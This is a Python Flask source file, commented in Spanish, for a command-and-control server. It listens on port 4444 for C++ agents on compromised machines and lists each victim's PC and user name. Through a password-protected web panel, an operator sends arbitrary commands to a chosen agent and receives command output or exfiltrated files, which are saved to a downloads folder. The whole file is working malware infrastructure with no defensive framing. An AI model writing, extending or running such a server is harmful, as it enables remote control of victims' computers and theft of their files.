from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import socket
import threading
import os  # Necesario para crear carpetas y manejar archivos
from functools import wraps

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD ---
app.secret_key = 'clave_maestra_super_secreta_2026' 
USER_ADMIN = "admin"
PASS_ADMIN = "pwned2026"

# --- MEMORIA COMPARTIDA ---
agentes = {}

# --- DECORADOR PARA PROTEGER RUTAS ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- HILO DE RED (Escucha agentes C++) ---
def escuchar_agentes():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(10)
    print("[*] Servidor de Red: Esperando agentes en el puerto 4444...")
    while True:
        try:
            conn, addr = server.accept()
            
            # Recibir identidad: "PC-NAME|USER"
            identidad = conn.recv(1024).decode('cp850', errors='replace')
            
            if "|" in identidad:
                pc_name, user_name = identidad.split("|")
            else:
                pc_name, user_name = "Desconocido", "Desconocido"

            id_agente = len(agentes)
            agentes[id_agente] = {
                "socket": conn, 
                "addr": addr, 
                "pc": pc_name,
                "user": user_name,
                "res": "Esperando comandos..."
            }
            print(f"[+] NUEVO AGENTE: {pc_name}\\{user_name} desde {addr[0]}")
            
        except Exception as e:
            print(f"[-] Error en red: {e}")

# --- RUTAS DE ACCESO ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != USER_ADMIN or request.form['password'] != PASS_ADMIN:
            error = 'Acceso denegado. Credenciales incorrectas.'
        else:
            session['logged_in'] = True
            return redirect(url_for('index'))
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- RUTAS DEL PANEL (MODIFICADA PARA DESCARGAS) ---

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/ejecutar', methods=['POST'])
@login_required
def ejecutar():
    try:
        id_target = int(request.form.get('id'))
        comando = request.form.get('comando')
        
        if id_target in agentes:
            conn = agentes[id_target]["socket"]
            conn.send(comando.encode())
            
            # Recibimos la respuesta inicial (pueden ser datos o texto)
            respuesta_raw = conn.recv(4096)
            
            # --- LÓGICA DE EXFILTRACIÓN ---
            if respuesta_raw.startswith(b"FILE_SIZE:"):
                # Extraer tamaño del archivo
                size = int(respuesta_raw.decode().split(":")[1])
                
                # Crear carpeta de descargas si no existe
                if not os.path.exists('downloads'):
                    os.makedirs('downloads')
                
                # Nombre de archivo único (basado en el ID y el nombre del PC)
                pc_folder = agentes[id_target]["pc"].replace(" ", "_")
                nombre_archivo = f"exfil_{pc_folder}_{id_target}.bin"
                ruta_final = os.path.join('downloads', nombre_archivo)
                
                # Recibir todos los bytes del archivo
                datos_acumulados = b""
                while len(datos_acumulados) < size:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    datos_acumulados += chunk
                
                # Guardar el archivo en el disco de Kali
                with open(ruta_final, "wb") as f:
                    f.write(datos_acumulados)
                
                res_final = f"ÉXITO: Archivo recibido ({size} bytes). Guardado en downloads/{nombre_archivo}"
            
            else:
                # Si no es un archivo, es texto normal (RCE o Dump)
                res_final = respuesta_raw.decode('cp850', errors='replace')

            agentes[id_target]["res"] = res_final
            return jsonify({"status": "success", "resultado": res_final})
        else:
            return jsonify({"status": "error", "resultado": "Agente no encontrado"})
    except Exception as e:
        return jsonify({"status": "error", "resultado": f"Error: {str(e)}"})

@app.route('/api/agentes')
@login_required
def api_agentes():
    datos = []
    for id_agente, info in agentes.items():
        datos.append({
            "id": id_agente,
            "ip": info["addr"][0],
            "pc": info.get("pc", "N/A"),
            "user": info.get("user", "N/A"),
            "resultado": info["res"]
        })
    return jsonify(datos)

if __name__ == '__main__':
    threading.Thread(target=escuchar_agentes, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
